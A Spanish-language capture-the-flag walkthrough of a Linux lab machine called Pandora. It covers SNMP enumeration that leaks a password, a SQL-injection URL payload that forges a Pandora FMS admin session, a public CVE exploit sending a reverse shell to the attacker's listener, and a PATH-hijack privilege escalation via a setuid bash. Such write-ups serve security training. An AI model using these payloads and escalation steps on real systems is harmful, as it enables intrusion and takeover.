# Resolución maquina Pandora

**Autor:** PepeMaquina  
**Fecha:** 22 de octubre de 2025  
**Dificultad:** Easy  
**Sistema Operativo:** Linux  
**Tags:** UDP, CVE, ssh.

---
## Imagen de la Máquina

![](pandora.jpg)

*Imagen: pandora.JPG*
## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.136 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,80 10.10.10.136 -oN targeted
~~~
Adicionalmente, algo que siempre hago, en cada maquina (aunque no la anote en los writeups) es realizar un escaneo por UDP, para ver que servicios corre, normalmente no corre ningun servicio, pero siempre puede que exista alguno.
~~~bash
sudo nmap -p- --open -sU --min-rate 8000 -n -Pn 10.10.11.136 -oG networket_udp
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 12:50 EDT
Warning: 10.10.11.136 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.136
Host is up (0.52s latency).
Not shown: 65433 open|filtered udp ports (no-response), 101 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
~~~
Por esta oportunidad aparecio un servicio conocido como SNMP que es un protocolo de red y vendria bien analizarlo.
### Enumeración de Servicios
Realizando una enumeracion exhaustiva por TCP se obtuvieron los servicios y versiones que corren.
~~~ bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
Ahora realizando el escaneo por UDP, como ya se de que se trata, se espera encontrar la "comunity string" que puede ser publica o privada, aunque lo mas comun es que las organizaciones usen una publica.
~~~bash
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.11.136 -w 100
Scanning 1 hosts, 120 communities
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.10.11.136 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
~~~
Se puede ver que presenta una llave publica, asi que inspeccionando mas a fondo, se puede ver algunos procesos que corren en el sistema objetivo, esto con herramientas como "snmpbulk" u otras, pero a mi me gusta mas usar "snmpbulkwalk" porque otorga mas información.
Esto es realmente tedioso porque otorga bastante información, pero se debe ver cada linea a detalle por si entrega alguna información util.
~~~bash
snmpbulkwalk -c public -v2c 10.10.11.136 .
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (59402) 0:09:54.02
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
....
<SNIP>
....
iso.3.6.1.2.1.25.4.2.1.5.694 = ""
iso.3.6.1.2.1.25.4.2.1.5.695 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"
iso.3.6.1.2.1.25.4.2.1.5.706 = STRING: "--foreground"
iso.3.6.1.2.1.25.4.2.1.5.707 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"
iso.3.6.1.2.1.25.4.2.1.5.711 = STRING: "-n -iNONE"
iso.3.6.1.2.1.25.4.2.1.5.720 = ""
iso.3.6.1.2.1.25.4.2.1.5.721 = ""
iso.3.6.1.2.1.25.4.2.1.5.722 = ""
iso.3.6.1.2.1.25.4.2.1.5.725 = ""
iso.3.6.1.2.1.25.4.2.1.5.812 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.823 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.824 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"
iso.3.6.1.2.1.25.4.2.1.5.825 = STRING: "-f"
iso.3.6.1.2.1.25.4.2.1.5.843 = ""
iso.3.6.1.2.1.25.4.2.1.5.857 = STRING: "-o -p -- \\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.861 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.876 = ""
iso.3.6.1.2.1.25.4.2.1.5.896 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.917 = ""
iso.3.6.1.2.1.25.4.2.1.5.984 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1001 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1002 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1130 = STRING: "-u daniel -p HotelBabylon23"
iso.3.6.1.2.1.25.4.2.1.5.1135 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1151 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1152 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1159 = STRING: "-k start"
....
<SNIP>
....
~~~
Revisando a detalle, cada linea, se puede ver que existe un proceso que involucra un usuario y contraseña, siempre es bueno anotar estos detalles.
Teniendo ya algunas credenciales, podria usarse para un inicio de sesion (si es que la página tendria alguno), pero como parece ser una linea de comando, posiblemente exista un usuario del servidor con dichas credenciales.
~~~bash
ssh daniel@10.10.11.136
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ED25519) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Oct 17:07:51 UTC 2025

  System load:           0.08
  Usage of /:            63.0% of 4.87GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             231
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f116

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$
~~~
Y efectivamente, se logro obtener acceso a un usuario en el servidor, por ahora todo bien.
### Pivoteo al usuario matt
Con acceso al usuario daniel ya se puede enumerar algunas cosas dentro del servidor, lastimosamente la user flag no se encuentra en este usuario.
Al revisar directorios, al parecer existe un usario "matt" al que tenemos acceso a su directorio de trabajabo.
~~~bash
daniel@pandora:/home$ ls
daniel  matt
daniel@pandora:/home$ cd matt/
daniel@pandora:/home/matt$ ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Oct 22 16:47 user.txt
~~~
En efecto, este usuario tiene la user flag, pero lastimosamente no se la puede.
Realizando algo de enumeración manual, se encontró dos carpetas que se estan hosteando en la ruta "/var/www/".
~~~bash
daniel@pandora:/var/www$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Dec  7  2021 .
drwxr-xr-x 14 root root 4096 Dec  7  2021 ..
drwxr-xr-x  3 root root 4096 Dec  7  2021 html
drwxr-xr-x  3 matt matt 4096 Dec  7  2021 pandora
~~~
De esto una fue creado por el usuario root y otro por el usuario pandora, asi que posiblemente tenga un subdominio asociado y pueda escalarse por esa parte (similar a la maquina soccer).
Al revisar el archivo de configuración de apache para subdominios, se pudo leer la siguiente información.
~~~bash
daniel@pandora:/var/www$ cat /etc/apache2/sites-available/pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
~~~
Se puede ver que el usuario matt es el que hostea la pagina web, pero por alguna razón parece estar hosteada en el puerto 80 pero solo localmente, ademas se ve que usar el el directorio de "/var/www/pandora" como ruta principal donde el dueño es matt.
Todo parece que debemos escalar al usuario matt para luego escalar a root.
Revisando los puertos que se usan en el servidor se tiene la siguiente informacion:
~~~bash
daniel@pandora:/var/www/pandora/pandora_console/include/db$ netstat -a
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost.localdo:mysql 0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      1 10.10.11.136:52108      1.1.1.1:domain          SYN_SENT   
tcp        0    244 10.10.11.136:ssh        10.10.14.17:51540       ESTABLISHED
tcp        0      0 10.10.11.136:ssh        10.10.14.17:55428       ESTABLISHED
tcp        0      0 10.10.11.136:34582      10.10.14.17:4431        ESTABLISHED
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
tcp6       1      0 ip6-localhost:http      ip6-localhost:37040     CLOSE_WAIT 
udp        0      0 10.10.11.136:58078      1.1.1.1:domain          ESTABLISHED
udp        0      0 10.10.11.136:43850      1.1.1.1:domain          ESTABLISHED
udp        0      0 localhost:domain        0.0.0.0:*                          
udp        0      0 0.0.0.0:snmp            0.0.0.0:*                          
udp6       0      0 ip6-localhost:snmp      [::]:*  
<SNIP>
~~~
Algo que realmente no entiendo, es que vimos una página web en el puerto 80 al realizar el escaneo, entonces ¿Cómo hostea una página por el puerto 80 internamente?, es algo realmente raro que no comprendo. 
Después de quedarme horas pensando en como puede ser posible hostear dos páginas distintas en el mismo puerto solo que una interna y otra externa, a menos que sea por el subdominio, me propuse a sacar hacer un portforwarding para poder ver el puerto externamente, esto ya es a gusto del usuario, para mi es mas facil hacerlo directamente son ssh.
~~~bash
ssh -L 8081:localhost:80 daniel@panda.htb                           
The authenticity of host 'panda.htb (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:82: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'panda.htb' (ED25519) to the list of known hosts.
daniel@panda.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Oct 18:51:40 UTC 2025

  System load:           0.0
  Usage of /:            63.0% of 4.87GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             223
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f116

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct 22 17:07:52 2025 from 10.10.14.17
daniel@pandora:~$
~~~
Con esto todo lo que pasaba por el puerto 80 del servidor se pasara directamente a mi puerto 8081, ahora nose si deberia agregar el subdominio "pandora.panda.htb" a mi "/etc/hosts" o no, asi que lo probare sin agregarlo.

![](pandora2.jpg)

BINGO!
Ya se puede ver otra interfaz y una versión de esta, es un buen segundo punto de partida.
### CVE-2020-5844
Al tener una versión en internet, se encontró que existe una vulnerabilidad para obtener un RCE en la aplicación web, pero para ello se necesita estar autenticado con un inicio de sesión valido (https://github.com/UNICORDev/exploit-CVE-2020-5844).

### CVE-2021-32099
Asi que buscando otras opciones para poder acceder a un panel de administrador, logre encontrar otro CVE que es un sql injection, al parecer funciona de la siguiente forma: Se puede agregar una direccion y aprovechando al sqli agrega una sesion para el usuario admin.
La url a ingresar seria esta ya modificada a lo que necesito.
~~~url
http://127.0.0.1:8081/pandora_console/include/chart_generator.php?session_id=PayloadHere%27%20union%20select%20%271%27,%272%27,%27id_usuario|s:5:%22admin%22;%27%20--%20a
~~~
En teoria agregara una sesion como admin y tan solo con recargar la página en la direccion "http://127.0.0.1:8081/pandora_console/" ya se tendria acceso al panel de administración.

![](pandora3.jpg)

En efecto, ya se tiene acceso al panel de administración, ahora aprovechando el contenido del primer CVE-2020-5844 que vi para un RCE, se puede jugar con la cookie session del usuario admin y lograr enviar una reverse shell a mi atacante.
Primero obteniendo la cookie.

![](pandora4.jpg)

Ahora corriendo el exploit para obtener una shell inversa.
~~~bash
python3 exploit-CVE-2020-5844.py -t 127.0.0.1 8081 -p 43kqgnulnoioshft4snonvfojc -s 10.10.14.17 4431

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution
OPTIONS: Reverse Shell Mode
PHPSESS: 43kqgnulnoioshft4snonvfojc
LOCALIP: 10.10.14.17:4431
WARNING: Be sure to start a local listener on the above IP and port.
WEBSITE: http://127.0.0.1:8081/pandora_console
EXPLOIT: Connected to website! Status Code: 200
EXPLOIT: Logged into Pandora FMS!
SUCCESS: Reverse shell executed! Check your local listener on 10.10.14.17:4431
~~~
Colocando un escucha en otra shell se logra obtener una sesion como el usuario matt.
~~~bash
sudo nc -nlvp 4431
[sudo] password for kali: 
listening on [any] 4431 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.136] 34582
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con acceso al usuario matt, ya es facil leer la user flag
~~~
matt@pandora:/var/www/pandora/pandora_console/images$ cd /home/matt/
matt@pandora:/home/matt$ ls
user.txt
matt@pandora:/home/matt$ cat user.txt
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Para la escalada de privilegios, se realizo una enumeración manual, para ello se vieron los permisos SUID, a lo que se vio.
~~~
matt@pandora@pandora:/home/matt$ find / -type f -perm -04000 -ls 2>/dev/null
   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
   267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd
   264371     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount
   264643     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su
   264040     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
   264219     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount
   267387     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh
   262815    464 -rwsr-xr-x   1 root     root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign
   264920     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264927     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   266611     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1

~~~
Se puede ver un binario interesante que no viene por defecto.
Se busco informacion en internet pero al parecer es algo creado por un usuario root dentro de la maquina.
Se quiso ver contenido legible con la herramienta strings pero no es encuentra instalada.
~~~bash
matt@pandora:/home/matt$ strings /usr/bin/pandora_backup

Command 'strings' not found, but can be installed with:

apt install binutils
Please ask your administrator.
~~~
Asi que a riesgo de que explote la maquina, realice un cat para ver si existe algo legible y pude ver lo siguiente:
~~~bash
matt@pandora:/home/matt$ cat /usr/bin/pandora_backup 

ELF>�@0:@8
              H�=�.�-����h�����.]�����{���UH��SH��������������މ������H�=n�����H�=������H�=���������tH�=��d�����H�=��Q���H�=��E����H�]���f.�AWL�=�+AVI��AUI��ATA��UH�-�+SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!
Check your permissions!Backup successful!Terminating program!<(�������������X}�������h���8zRx
                                                                                            8���+zRx
....                                                                          <SNIP>                                                                           ....
~~~
Si se tiene un buen ojo, se puede ver que hay algo legible con una pequeña descripcion y una tarea que realiza, esto utiliza "tar" para hacer un backup al directorio "pandora" de la página web, pero si se ve a detalle este no usa una ruta absoluta, por lo que se puede dar a lugar un PATH HIJACKING.
Algo raro que pude notar, es que hay algo mal con la shell porque al realizar la enumeración con "sudo -l" salen errores:
~~~bash
matt@pandora:/home/matt$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
~~~
Ademas al correr el binario para que haga su funcion normal, este no se ejecuta y hace practicamente nada.
~~~bash
matt@pandora:/home/matt$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
~~~
Esto no puede ser posible porque el binario tiene permisos SUID asi que deberia poder ingresar a la carpeta root sin problemas, asi que es algo raro, por lo que lo mas seguro es iniciar sesion por ssh, pero no se encuentra el archivo en ningun lugar.
Realizando enumeracion de la base de datos, no pude obtener ninguna contraseña que se este reusando, por lo que se procedio a crear un nuevo archivo ssh con credenciales nulas robando el id_rsa.
~~~bash
matt@pandora:/home/matt$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/matt/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:QoLosxBgTdCCVkDCkhAkOY2sqHx1ygmuGCX844fowbk matt@pandora
The key's randomart image is:
+---[RSA 3072]----+
|&%Bo             |
|%*.+             |
|O.o . .          |
|=o.. + .         |
|+=o + = S        |
|=.+= + .         |
|.*= o            |
|.ooo .           |
|.E  .            |
+----[SHA256]-----+

matt@pandora:/home/matt$ cd .ssh/
matt@pandora:/home/matt/.ssh$ cat id_rsa.pub > authorized_keys
matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys 
matt@pandora:/home/matt/.ssh$ ls -l
total 12
-rw------- 1 matt matt 2602 Oct 22 20:13 authorized_keys
-rw------- 1 matt matt 2602 Oct 22 20:12 id_rsa
-rw-r--r-- 1 matt matt  566 Oct 22 20:12 id_rsa.pub
matt@pandora:/home/matt/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
zqKgzMAmcfUA0AAAAMbWF0dEBwYW5kb3JhAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
~~~
Copiando el id_rsa en mi maquina atacante y otorgandole permidos 600 se pudo ingresar por ssh.
~~~bash
nano id_rsa

chmod 600 id_rsa

ssh -i id_rsa matt@10.10.11.136
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Oct 20:19:09 UTC 2025

  System load:           0.0
  Usage of /:            63.2% of 4.87GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             247
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:fe94:f116

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$
~~~
Ahora si, comprobando que la nueva shell corre de forma correcta se hace el basico "sudo -l"
~~~bash
matt@pandora:~$ sudo -l
[sudo] password for matt: 
~~~
Ahora si pide una contraseña, por lo que supongo que funciona correctamente.
Tambien corriendo el binario este funciona correctamente.
~~~bash
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: Removing leading `/' from member names
/var/www/pandora/pandora_console/AUTHORS
tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
<SNIP>
/var/www/pandora/pandora_console/ws.php
Backup successful!
Terminating program!
~~~
Entonces ahora si se puede proseguir con el PATH INJECTION, para ello se crea un archivo con el contenido que se quiera hacer somo super usuario (robar el id_rsa, permisos sudo a la bash, ejecutar una bash, etc), luego otorgarle permisos de ejecución, aladirla al principio del la ruta $PATH y finalmente correr el binario.
~~~bash
matt@pandora:/tmp$ echo "chmod u+s /bin/bash" > tar
matt@pandora:/tmp$ chmod +x tar 
matt@pandora:/tmp$ export PATH=$(pwd):$PATH
matt@pandora:/tmp$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
matt@pandora:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
~~~
Viendo los permisos de la bash, se puede ver que ya tiene permisos suid.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

En este punto, ya se puede entablar una sesion como root y poder leer la root flag.
~~~bash
matt@pandora:/tmp$ /bin/bash -p
bash-5.0# cd /root
bash-5.0# cat root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido

